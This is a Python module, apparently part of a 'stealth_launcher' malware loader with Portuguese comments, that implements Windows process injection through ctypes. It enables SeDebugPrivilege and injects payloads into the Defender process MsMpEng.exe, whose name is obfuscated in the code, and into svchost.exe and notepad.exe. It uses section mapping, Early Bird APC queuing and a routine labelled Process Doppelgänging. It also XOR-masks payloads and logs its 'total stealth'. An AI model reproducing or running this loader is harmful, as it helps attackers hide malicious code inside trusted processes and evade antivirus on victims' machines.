import ctypes
import logging
import random
import struct
from ctypes import wintypes, byref, c_void_p, c_size_t, POINTER
from pathlib import Path
from stealth_launcher.exceptions import StageError

# Correções necessárias para evitar AttributeError
NTSTATUS = ctypes.c_long
ACCESS_MASK = wintypes.DWORD
LARGE_INTEGER = ctypes.c_longlong
ULONG_PTR = ctypes.c_ulonglong

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
ntdll = ctypes.WinDLL('ntdll', use_last_error=True)
advapi32 = ctypes.WinDLL('advapi32', use_last_error=True)

TH32CS_SNAPPROCESS = 0x00000002
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
PAGE_EXECUTE_READWRITE = 0x40
PROCESS_ALL_ACCESS = 0x1F0FFF
EXTENDED_STARTUPINFO_PRESENT = 0x00080000
CREATE_SUSPENDED = 0x4
PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
SEC_COMMIT = 0x08000000
IMAGE_DOS_SIGNATURE = 0x5A4D

class LUID(ctypes.Structure):
    _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [("PrivilegeCount", wintypes.DWORD), ("Privileges", LUID_AND_ATTRIBUTES)]

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ('dwSize', wintypes.DWORD),
        ('cntUsage', wintypes.DWORD),
        ('th32ProcessID', wintypes.DWORD),
        ('th32DefaultHeapID', ctypes.c_ulonglong),
        ('th32ModuleID', wintypes.DWORD),
        ('cntThreads', wintypes.DWORD),
        ('th32ParentProcessID', wintypes.DWORD),
        ('pcPriClassBase', wintypes.LONG),
        ('dwFlags', wintypes.DWORD),
        ('szExeFile', wintypes.CHAR * 260),
    ]

class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ('cb', wintypes.DWORD),
        ('lpReserved', wintypes.LPWSTR),
        ('lpDesktop', wintypes.LPWSTR),
        ('lpTitle', wintypes.LPWSTR),
        ('dwX', wintypes.DWORD),
        ('dwY', wintypes.DWORD),
        ('dwXSize', wintypes.DWORD),
        ('dwYSize', wintypes.DWORD),
        ('dwXCountChars', wintypes.DWORD),
        ('dwYCountChars', wintypes.DWORD),
        ('dwFillAttribute', wintypes.DWORD),
        ('dwFlags', wintypes.DWORD),
        ('wShowWindow', wintypes.WORD),
        ('cbReserved2', wintypes.WORD),
        ('lpReserved2', ctypes.POINTER(ctypes.c_byte)),
        ('hStdInput', wintypes.HANDLE),
        ('hStdOutput', wintypes.HANDLE),
        ('hStdError', wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('hProcess', wintypes.HANDLE),
        ('hThread', wintypes.HANDLE),
        ('dwProcessId', wintypes.DWORD),
        ('dwThreadId', wintypes.DWORD),
    ]

kernel32.GetLastError.restype = wintypes.DWORD
ntdll.NtCreateThreadEx.restype = wintypes.HANDLE
ntdll.NtCreateSection.restype = NTSTATUS
ntdll.NtMapViewOfSection.restype = NTSTATUS
ntdll.NtUnmapViewOfSection.restype = NTSTATUS
kernel32.QueueUserAPC.argtypes = [ULONG_PTR, wintypes.HANDLE, ULONG_PTR]
kernel32.VirtualAllocEx.restype = c_void_p
kernel32.ResumeThread.argtypes = [wintypes.HANDLE]
kernel32.ResumeThread.restype = wintypes.DWORD

kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, c_void_p, c_void_p, c_size_t, POINTER(c_size_t)]
kernel32.CreateProcessW.argtypes = [
    wintypes.LPCWSTR, wintypes.LPWSTR, c_void_p, c_void_p,
    wintypes.BOOL, wintypes.DWORD, c_void_p, wintypes.LPCWSTR,
    POINTER(STARTUPINFO), POINTER(PROCESS_INFORMATION)
]

def _enable_debug_privilege():
    hToken = wintypes.HANDLE()
    current_process = wintypes.HANDLE(kernel32.GetCurrentProcess())

    if not advapi32.OpenProcessToken(current_process, 0x20 | 0x8, byref(hToken)):
        raise StageError(f"OpenProcessToken falhou: {kernel32.GetLastError()}")

    luid = LUID()
    if not advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", byref(luid)):
        raise StageError(f"LookupPrivilegeValue falhou: {kernel32.GetLastError()}")

    tp = TOKEN_PRIVILEGES(
        PrivilegeCount=1,
        Privileges=LUID_AND_ATTRIBUTES(Luid=luid, Attributes=0x2)
    )
    if not advapi32.AdjustTokenPrivileges(hToken, False, byref(tp), 0, None, None):
        raise StageError(f"AdjustTokenPrivileges falhou: {kernel32.GetLastError()}")

    if kernel32.GetLastError() != 0:
        raise StageError(f"AdjustTokenPrivileges executado, mas GetLastError indica falha: {kernel32.GetLastError()}")

def _find_pid_by_name(target_name: str):
    snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshot == -1:
        raise StageError(f"CreateToolhelp32Snapshot falhou: {kernel32.GetLastError()}")

    entry = PROCESSENTRY32()
    entry.dwSize = ctypes.sizeof(PROCESSENTRY32)

    if not kernel32.Process32First(snapshot, byref(entry)):
        kernel32.CloseHandle(snapshot)
        raise StageError(f"Process32First falhou: {kernel32.GetLastError()}")

    while True:
        exe_name = bytes(entry.szExeFile).split(b'\x00', 1)[0].decode('utf-8').lower()
        if exe_name == target_name.lower():
            kernel32.CloseHandle(snapshot)
            return entry.th32ProcessID
        if not kernel32.Process32Next(snapshot, byref(entry)):
            break

    kernel32.CloseHandle(snapshot)
    return None

def _xor_encrypt(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)


def hollow_msmpeng(payload_path: Path):
    logging.info("[Injection] Ativando SeDebugPrivilege...")
    _enable_debug_privilege()

    with open(payload_path, 'rb') as f:
        raw_payload = f.read()

    xor_key = random.randint(1, 255)
    encrypted_payload = bytes([xor_key]) + _xor_encrypt(raw_payload, xor_key)
    payload_size = len(encrypted_payload)

    size = c_size_t(payload_size)
    section_handle = wintypes.HANDLE()
    status = ntdll.NtCreateSection(byref(section_handle), 0xF001F, None, byref(size), PAGE_EXECUTE_READWRITE, SEC_COMMIT, None)
    if status != 0:
        raise StageError(f"NtCreateSection falhou: {status}")

    local_base = c_void_p()
    status = ntdll.NtMapViewOfSection(section_handle, kernel32.GetCurrentProcess(), byref(local_base), 0, 0, None, byref(size), 2, 0, PAGE_READWRITE)
    if status != 0:
        raise StageError(f"NtMapViewOfSection (local) falhou: {status}")

    ctypes.memmove(local_base, encrypted_payload, payload_size)
    ntdll.NtUnmapViewOfSection(kernel32.GetCurrentProcess(), local_base)

    target_process = ''.join([chr(x) for x in [77, 115, 77, 112, 69, 110, 103, 46, 101, 120, 101]])
    pid = _find_pid_by_name(target_process)
    if not pid:
        raise StageError("MsMpEng.exe não encontrado")

    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        raise StageError(f"OpenProcess falhou: {kernel32.GetLastError()}")

    remote_base = c_void_p()
    status = ntdll.NtMapViewOfSection(section_handle, h_process, byref(remote_base), 0, 0, None, byref(size), 2, 0, PAGE_EXECUTE_READ)
    if status != 0:
        raise StageError(f"NtMapViewOfSection (remote) falhou: {status}")

    thread_handle = kernel32.CreateRemoteThread(h_process, None, 0, 0, 0, CREATE_SUSPENDED, 0)
    if not thread_handle:
        raise StageError(f"CreateRemoteThread suspensa falhou: {kernel32.GetLastError()}")

    if kernel32.QueueUserAPC(remote_base, thread_handle, 0) == 0:
        raise StageError("QueueUserAPC falhou")

    if kernel32.ResumeThread(thread_handle) == -1:
        raise StageError("ResumeThread falhou")

    logging.info(f"[Injection] Payload injetado de forma FURTIVA TOTAL em {target_process} (PID {pid})")


def early_bird_injection(payload_path: Path, target_process: str):
    logging.info("[EarlyBird] Ativando SeDebugPrivilege...")
    _enable_debug_privilege()

    with open(payload_path, 'rb') as f:
        payload = f.read()
    xor_key = random.randint(1, 255)
    encrypted = bytes([xor_key]) + _xor_encrypt(payload, xor_key)
    size = len(encrypted)

    startupinfo = STARTUPINFO()
    startupinfo.cb = ctypes.sizeof(startupinfo)
    pi = PROCESS_INFORMATION()

    if not kernel32.CreateProcessW(
        None,
        "C:\\Windows\\System32\\svchost.exe",  # <- Pode substituir por target_process se quiser
        None, None, False,
        CREATE_SUSPENDED,
        None, None,
        byref(startupinfo), byref(pi)
    ):
        raise StageError(f"CreateProcessW falhou: {kernel32.GetLastError()}")

    remote_buffer = kernel32.VirtualAllocEx(
        pi.hProcess, None, size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )
    if not remote_buffer:
        raise StageError(f"VirtualAllocEx falhou: {kernel32.GetLastError()}")

    written = c_size_t(0)
    if not kernel32.WriteProcessMemory(pi.hProcess, remote_buffer, encrypted, size, byref(written)):
        raise StageError(f"WriteProcessMemory falhou: {kernel32.GetLastError()}")

    if kernel32.QueueUserAPC(remote_buffer, pi.hThread, 0) == 0:
        raise StageError("QueueUserAPC falhou")

    if kernel32.ResumeThread(pi.hThread) == -1:
        raise StageError("ResumeThread falhou")

    logging.info(f"[EarlyBird] Payload injetado com sucesso via APC em PID: {pi.dwProcessId}")

    


def kernel_assisted_reflective_loader(payload_path: Path, target_process: str):
    logging.info("[KernelAssist] Placeholder - função de carregamento reflexivo assistido por kernel ainda não implementada.")
    raise NotImplementedError("Função 'kernel_assisted_reflective_loader' ainda não foi implementada.")

def dynamic_syscall_resolution(payload_path: Path, target_process: str):
    logging.info("[Syscall] Placeholder - resolução dinâmica de syscall ainda não implementada.")
    raise NotImplementedError("Função 'dynamic_syscall_resolution' ainda não foi implementada.")

def ghost_apc_injection(payload_path: Path, target_process: str):
    logging.info("[GhostAPC] Placeholder - técnica de Ghost APC ainda não implementada.")
    raise NotImplementedError("Função 'ghost_apc_injection' ainda não foi implementada.")

def hop_scotch_injection(payload_path: Path, target_process: str):
    logging.info("[HopScotch] Placeholder - técnica Hop Scotch ainda não implementada.")
    raise NotImplementedError("Função 'hop_scotch_injection' ainda não foi implementada.")


def process_doppelgaenging_complete(payload_path: Path):
    logging.info("[Doppelgänging] Iniciando técnica de Process Doppelgänging...")

    def read_payload(path):
        with open(path, "rb") as f:
            return f.read()

    def get_entrypoint(payload_data):
        dos_header = struct.unpack_from("<H", payload_data, 0)[0]
        if dos_header != IMAGE_DOS_SIGNATURE:
            raise ValueError("PE inválido: MZ header não encontrado")
        e_lfanew = struct.unpack_from("<I", payload_data, 0x3C)[0]
        entry_rva = struct.unpack_from("<I", payload_data, e_lfanew + 0x28)[0]
        return entry_rva

    payload = read_payload(payload_path)
    entry_rva = get_entrypoint(payload)
    logging.info(f"[Doppelgänging] EntryPoint RVA: 0x{entry_rva:X}")

    si = STARTUPINFO()
    si.cb = ctypes.sizeof(si)
    pi = PROCESS_INFORMATION()

    target = "C:\\Windows\\System32\\notepad.exe"
    if not kernel32.CreateProcessW(target, None, None, None, False, CREATE_SUSPENDED, None, None, byref(si), byref(pi)):
        raise StageError("CreateProcessW falhou")

    logging.info(f"[Doppelgänging] Processo suspenso criado: PID {pi.dwProcessId}")

    section = wintypes.HANDLE()
    max_size = c_size_t(len(payload))
    status = ntdll.NtCreateSection(byref(section), 0xF001F, None, byref(max_size), PAGE_EXECUTE_READ, 0x1000000, None)
    if status != 0:
        raise StageError("NtCreateSection falhou")

    base_address = c_void_p()
    view_size = c_size_t(0)
    status = ntdll.NtMapViewOfSection(section, pi.hProcess, byref(base_address), 0, 0, None, byref(view_size), 1, 0, PAGE_EXECUTE_READ)
    if status != 0:
        raise StageError("NtMapViewOfSection falhou")

    written = c_size_t(0)
    kernel32.WriteProcessMemory(pi.hProcess, base_address, payload, len(payload), byref(written))

    remote_entry = base_address.value + entry_rva
    thread_handle = wintypes.HANDLE()
    status = ntdll.NtCreateThreadEx(byref(thread_handle), 0x1FFFFF, None, pi.hProcess, c_void_p(remote_entry), None, False, 0, 0, 0, None)
    if status != 0:
        raise StageError("NtCreateThreadEx falhou")
    

    logging.info(f"[Doppelgänging] Payload executado com sucesso no endereço 0x{remote_entry:X}")
    
    
    